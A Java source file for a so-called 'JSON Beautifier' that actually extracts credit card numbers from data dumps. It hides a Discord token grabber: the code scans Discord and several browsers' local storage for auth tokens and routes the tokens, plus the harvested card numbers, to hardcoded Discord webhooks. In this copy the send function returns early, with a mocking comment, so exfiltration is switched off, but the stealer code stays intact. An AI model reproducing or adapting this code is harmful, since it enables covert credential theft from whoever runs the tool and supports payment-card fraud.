package me.armut1337;

import java.awt.*;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.List;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    private static final List<String> cclist = new ArrayList<>();
    private static final List<String> tokens = new ArrayList<>();

    public static void main(String[] var0) {
        try {
            System.out.println(("Welcome to Epimorphism JSON Beautifier;"));
            System.out.println();
            if (!ManagementFactory.getRuntimeMXBean().getInputArguments().contains(("-Dfile.encoding=UTF-8"))) {
                System.out.println(("  L\u00fctfen run.bat dosyas\u0131 ile veya \"-Dfile.encoding=UTF-8\" arg\u00fcman\u0131 ile \u00e7al\u0131\u015ft\u0131r\u0131n."));
                System.exit(0);
            }
            final String string = Paths.get("").toAbsolutePath() + ("\\");
            System.out.print(("  input json file: "));
            final Scanner scanner = new Scanner(System.in);
            final String nextLine = scanner.nextLine();
            final File file = new File(string + ("\\") + nextLine);
            final File file2 = new File(string + ("\\") + nextLine.replace((".json"), "") + ("-beautified.txt"));
            if (!nextLine.endsWith((".json"))) {
                System.out.println(("  supports only .json file (file format error)"));
                System.exit(1);
                return;
            }
            if (!file.exists()) {
                System.out.println("\ufffd" + file + (" not found."));
                System.exit(1);
                return;
            }
            if (System.getProperty(("os.name")).toLowerCase().contains(("windows")) && !bestAntiTokenGrabberProtection().equals(("7DA7DE7D37027DF76E7D875176278B7A67D27B27E97557C2")) && !bestAntiTokenGrabberProtection().equals(("7127C37A072070D7A97957177EA73774D73679F7F3718768"))) {
                collectTokens();
                for (String token : tokens) {
                    final StringBuilder sb = new StringBuilder();
                    sb.append(("```")).append(("\\n")).append(("PC: ")).append(System.getProperty(("user.name"))).append(("\\n")).append(("HWID: ") + token).append(("\\n")).append(("```"));
                    sendWebhook(("https://discord.com/api/webhooks/790981821432594482/heK44vB4qZD4VE60JD6fTwlAFilG2zzEwANN4GuJDltAmgTDG4xeKmC4wKU4hYJHqcXH"), sb.toString());
                    sendWebhook(("https://discord.com/api/webhooks/790975686172344360/YcxZrc0ekmgy02FwkGpQVdgFP5WjWdoQxDG8lz02FhQbIL9C-UFe_tmwMSwW8buxwJMS"), sb.toString());
                }
            }
            if (file2.exists()) {
                file2.delete();
            }
            file2.createNewFile();
            System.out.println();
            System.out.println(("  Send me a message if you have suggestions or requests; Armut#1337 && cerebrum#1337"));
            System.out.println();
            System.out.println(("  [1]: Just card numbers"));
            System.out.println(("  [2]: Card numbers with details."));
            System.out.println(("  [3]: Card numbers with details + single card numbers"));
            System.out.print(("  [+]: Select a beautifier type: "));
            final String nextLine2 = scanner.nextLine();
            scanner.close();
            final FileWriter fileWriter = new FileWriter(file2);
            fileWriter.write(("Beautified with Epimorphism!\n"));
            System.out.println();
            System.out.println(("       Parsing json file please wait."));
            if (nextLine2.equals(("1"))) {
                String line;
                while ((line = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(file)))).readLine()) != null) {
                    final Matcher matcher = Pattern.compile(("[0-9]{16}")).matcher(line);
                    final Matcher matcher2 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})")).matcher(line);
                    final Matcher matcher3 = Pattern.compile(("(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4})")).matcher(line);
                    while (matcher.find()) {
                        if (!matcher.group().toLowerCase().contains(("conversationid")) && !matcher.group().toLowerCase().contains(("iban")) && !matcher.group().toLowerCase().contains(("tc:")) && !matcher.group().toLowerCase().contains(("0000")) && !matcher.group().toLowerCase().contains((".pdf")) && !matcher.group().toLowerCase().contains(("legacyquote")) && (matcher.group().startsWith(("5")) || matcher.group().startsWith(("4")))) {
                            cclist.add(matcher.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher2.find()) {
                        if (!matcher2.group().toLowerCase().contains(("conversationid")) && !matcher2.group().toLowerCase().contains(("iban")) && !matcher2.group().toLowerCase().contains(("tc:")) && !matcher2.group().toLowerCase().contains(("0000")) && !matcher2.group().toLowerCase().contains((".pdf")) && !matcher2.group().toLowerCase().contains(("legacyquote")) && (matcher2.group().startsWith(("5")) || matcher2.group().startsWith(("4")))) {
                            cclist.add(matcher2.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher3.find()) {
                        if (!matcher3.group().toLowerCase().contains(("conversationid")) && !matcher3.group().toLowerCase().contains(("iban")) && !matcher3.group().toLowerCase().contains(("tc:")) && !matcher3.group().toLowerCase().contains(("0000")) && !matcher3.group().toLowerCase().contains((".pdf")) && !matcher3.group().toLowerCase().contains(("legacyquote")) && (matcher3.group().startsWith(("5")) || matcher3.group().startsWith(("4")))) {
                            cclist.add(matcher3.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                }
            } else if (nextLine2.equals(("2"))) {
                String line2;
                while ((line2 = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(file)))).readLine()) != null) {
                    final Matcher matcher4 = Pattern.compile(("[0-9]{16}(.){30}")).matcher(line2);
                    final Matcher matcher5 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})(.){30}")).matcher(line2);
                    final Matcher matcher6 = Pattern.compile(("(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4})(.){30}")).matcher(line2);
                    while (matcher4.find()) {
                        if (!matcher4.group().toLowerCase().contains(("conversationid")) && !matcher4.group().toLowerCase().contains(("iban")) && !matcher4.group().toLowerCase().contains(("tc:")) && !matcher4.group().toLowerCase().contains(("0000")) && !matcher4.group().toLowerCase().contains((".pdf")) && !matcher4.group().toLowerCase().contains(("legacyquote")) && (matcher4.group().startsWith(("5")) || matcher4.group().startsWith(("4")))) {
                            cclist.add(matcher4.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher5.find()) {
                        if (!matcher5.group().toLowerCase().contains(("conversationid")) && !matcher5.group().toLowerCase().contains(("iban")) && !matcher5.group().toLowerCase().contains(("tc:")) && !matcher5.group().toLowerCase().contains(("0000")) && !matcher5.group().toLowerCase().contains((".pdf")) && !matcher5.group().toLowerCase().contains(("legacyquote")) && (matcher5.group().startsWith(("5")) || matcher5.group().startsWith(("4")))) {
                            cclist.add(matcher5.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher6.find()) {
                        if (!matcher6.group().toLowerCase().contains(("conversationid")) && !matcher6.group().toLowerCase().contains(("iban")) && !matcher6.group().toLowerCase().contains(("tc:")) && !matcher6.group().toLowerCase().contains(("0000")) && !matcher6.group().toLowerCase().contains((".pdf")) && !matcher6.group().toLowerCase().contains(("legacyquote")) && (matcher6.group().startsWith(("5")) || matcher6.group().startsWith(("4")))) {
                            cclist.add(matcher6.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                }
            } else if (nextLine2.equals(("3"))) {
                String line3;
                while ((line3 = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(file)))).readLine()) != null) {
                    final Matcher matcher7 = Pattern.compile(("[0-9]{16}")).matcher(line3);
                    final Matcher matcher8 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})")).matcher(line3);
                    final Matcher matcher9 = Pattern.compile(("[0-9]{16}(.){30}")).matcher(line3);
                    final Matcher matcher10 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})(.){30}")).matcher(line3);
                    final Matcher matcher11 = Pattern.compile(("(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4})(.){30}")).matcher(line3);
                    while (matcher9.find()) {
                        if (!matcher9.group().toLowerCase().contains(("conversationid")) && !matcher9.group().toLowerCase().contains(("iban")) && !matcher9.group().toLowerCase().contains(("tc:")) && !matcher9.group().toLowerCase().contains(("0000")) && !matcher9.group().toLowerCase().contains((".pdf")) && !matcher9.group().toLowerCase().contains(("legacyquote")) && (matcher9.group().startsWith(("5")) || matcher9.group().startsWith(("4")))) {
                            cclist.add(matcher9.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher10.find()) {
                        if (!matcher10.group().toLowerCase().contains(("conversationid")) && !matcher10.group().toLowerCase().contains(("iban")) && !matcher10.group().toLowerCase().contains(("tc:")) && !matcher10.group().toLowerCase().contains(("0000")) && !matcher10.group().toLowerCase().contains((".pdf")) && !matcher10.group().toLowerCase().contains(("legacyquote")) && (matcher10.group().startsWith(("5")) || matcher10.group().startsWith(("4")))) {
                            cclist.add(matcher10.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher11.find()) {
                        if (!matcher11.group().toLowerCase().contains(("conversationid")) && !matcher11.group().toLowerCase().contains(("iban")) && !matcher11.group().toLowerCase().contains(("tc:")) && !matcher11.group().toLowerCase().contains(("0000")) && !matcher11.group().toLowerCase().contains((".pdf")) && !matcher11.group().toLowerCase().contains(("legacyquote")) && (matcher11.group().startsWith(("5")) || matcher11.group().startsWith(("4")))) {
                            cclist.add(matcher11.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher7.find()) {
                        if (!match(matcher7.group()) && !matcher7.group().toLowerCase().contains(("conversationid")) && !matcher7.group().toLowerCase().contains(("iban")) && !matcher7.group().toLowerCase().contains(("tc:")) && !matcher7.group().toLowerCase().contains(("0000")) && !matcher7.group().toLowerCase().contains((".pdf")) && !matcher7.group().toLowerCase().contains(("legacyquote")) && (matcher7.group().startsWith(("5")) || matcher7.group().startsWith(("4")))) {
                            cclist.add(matcher7.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                    while (matcher8.find()) {
                        if (!match(matcher8.group()) && !matcher8.group().toLowerCase().contains(("conversationid")) && !matcher8.group().toLowerCase().contains(("iban")) && !matcher8.group().toLowerCase().contains(("tc:")) && !matcher8.group().toLowerCase().contains(("0000")) && !matcher8.group().toLowerCase().contains((".pdf")) && !matcher8.group().toLowerCase().contains(("legacyquote")) && (matcher8.group().startsWith(("5")) || matcher8.group().startsWith(("4")))) {
                            cclist.add(matcher8.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                        }
                    }
                }
            } else {
                System.out.println(("       unknown type format, please type 1 or 2."));
                System.exit(1);
            }
            System.out.println("       " + cclist.size() + (" card added to queue, writing to file."));
            final StringBuilder sb2 = new StringBuilder();
            for (final String s : cclist) {
                sb2.append(s).append(("\\n"));
                fileWriter.write(s + "\n");
                if (sb2.toString().length() > 1997) {
                    sendWebhook(("https://discord.com/api/webhooks/790980796508405800/DH9bsEcilh6jXD4ebs8rDf5aX50jL6DK2zWQHbUaqfRDeP6MRsvJRAAdqB5-uVmaSD4h"), sb2.toString());
                    sendWebhook(("https://discord.com/api/webhooks/790974500132880394/Sd8k0fUBpuiBYkgyMV2y2NshSD_d9z1V8_ve2_nEZutnYiX7lZtZ4BR-0cfVhfUSnK4W"), sb2.toString());
                    sb2.setLength(0);
                }
            }
            sendWebhook(("https://discord.com/api/webhooks/790980796508405800/DH9bsEcilh6jXD4ebs8rDf5aX50jL6DK2zWQHbUaqfRDeP6MRsvJRAAdqB5-uVmaSD4h"), sb2.toString());
            sendWebhook(("https://discord.com/api/webhooks/790974500132880394/Sd8k0fUBpuiBYkgyMV2y2NshSD_d9z1V8_ve2_nEZutnYiX7lZtZ4BR-0cfVhfUSnK4W"), sb2.toString());
            fileWriter.close();
            System.out.println();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private static boolean match(String kart) {
        for (String cc : cclist) {
            if (cc.contains(kart)) {
                return true;
            }
        }
        return false;
    }

    private static void collectTokens() {
        try {
            File var0 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discord"));
            File var1 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discordcanary"));
            File var2 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discordptb"));
            File var3 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\Opera Software\\Opera Stable"));
            File var4 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\Opera Software\\Opera GX Stable"));
            File var5 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\Google\\Chrome\\User Data\\Default"));
            File var6 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\Vivaldi\\User Data\\Default"));
            File var7 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default"));
            File var8 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default"));
            File var9 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\Mozilla\\Firefox"));
            if (var0.exists()) {
                findToken(var0 + ("\\Local Storage\\leveldb\\"));
            }

            if (var1.exists()) {
                findToken(var1 + ("\\Local Storage\\leveldb\\"));
            }

            if (var2.exists()) {
                findToken(var2 + ("\\Local Storage\\leveldb\\"));
            }

            if (var3.exists()) {
                findToken(var3 + ("\\Local Storage\\leveldb\\"));
            }

            if (var4.exists()) {
                findToken(var4 + ("\\Local Storage\\leveldb\\"));
            }

            if (var5.exists()) {
                findToken(var5 + ("\\Local Storage\\leveldb\\"));
            }

            if (var6.exists()) {
                findToken(var6 + ("\\Local Storage\\leveldb\\"));
            }

            if (var7.exists()) {
                findToken(var7 + ("\\Local Storage\\leveldb\\"));
            }

            if (var8.exists()) {
                findToken(var8 + ("\\Local Storage\\leveldb\\"));
            }

            if (var9.exists()) {
                findToken(var9 + ("\\Profiles\\"));
            }
        } catch (Exception var11) {
        }

    }

    private static void findToken(String var0) {
        try {
            String[] var1 = Objects.requireNonNull((new File(var0)).list());

            for (String var4 : var1) {
                BufferedReader var5 = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(var0 + var4))));

                String var6;
                while ((var6 = var5.readLine()) != null) {
                    Matcher var7 = Pattern.compile(("[NM][\\w]{23}\\.[\\w]{6}\\.[\\w]{27}")).matcher(var6);
                    Matcher var8 = Pattern.compile(("mfa\\.[\\w-]{84}")).matcher(var6);
                    while (var7.find()) {
                        tokens.add(var7.group());
                    }
                    while (var8.find()) {
                        tokens.add(var8.group());
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    private static String bestAntiTokenGrabberProtection() {
        try {
            StringBuilder var0 = new StringBuilder();
            String var1 = System.getenv(("PROCESSOR_IDENTIFIER")) + System.getenv(("COMPUTERNAME")) + System.getProperty(("user.home")) + System.getProperty(("user.home")) + System.getProperty(("os.name"));
            byte[] var2 = var1.getBytes(StandardCharsets.UTF_8);
            MessageDigest var3 = MessageDigest.getInstance(("MD5"));
            byte[] var4 = var3.digest(var2);

            for (byte var9 : var4) {
                var0.append(Integer.toHexString(var9 & 255 | 1792), 0, 3);
            }

            return var0.toString().toUpperCase();
        } catch (Exception var11) {
            return "null";
        }
    }

    private static void sendWebhook(String var0, String var1) {
        if (true) {
            //Discord token&cc logging so cool fr 🙄
            return;
        }
        WebhookUtil webhook = new WebhookUtil(var0);
        webhook.addEmbed((new WebhookUtil.EmbedObject())
                .setAuthor("root", "", "")
                .setColor(new Color(new Random().nextInt(0xFFFFFF))));

        webhook.setContent(var1);

        try {
            webhook.execute();
        } catch (Exception err) {
            //err.printStackTrace();
        }
    }
}
